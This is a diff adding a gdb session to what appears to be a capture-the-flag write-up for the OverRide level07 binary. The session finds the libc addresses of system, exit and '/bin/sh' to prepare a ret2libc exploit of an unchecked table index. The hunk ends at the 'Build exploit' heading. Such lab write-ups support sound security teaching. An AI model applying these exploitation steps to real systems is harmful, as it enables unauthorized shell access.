@@ -61,7 +61,27 @@ Vulnerability: no check performed on the index and unsigned int table is stored 
 4) exploit by inputting malicious number + index to running program
 
 
+```
+level07@OverRide:~$ gdb -q level07
 
+(gdb) b*main
+Breakpoint 1 at 0x8048723
+(gdb) run
+[...]
+
+(gdb) p system
+$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
+
+(gdb) p exit
+$2 = {<text variable, no debug info>} 0xf7e5eb70 <exit>
+
+(gdb) find &system,+9999999,"/bin/sh"
+0xf7f897ec
+warning: Unable to access target memory at 0xf7fd3b74, halting search.
+1 pattern found.
+(gdb) x/s 0xf7f897ec
+0xf7f897ec:	 "/bin/sh"
+```
 
 ### Build exploit
 
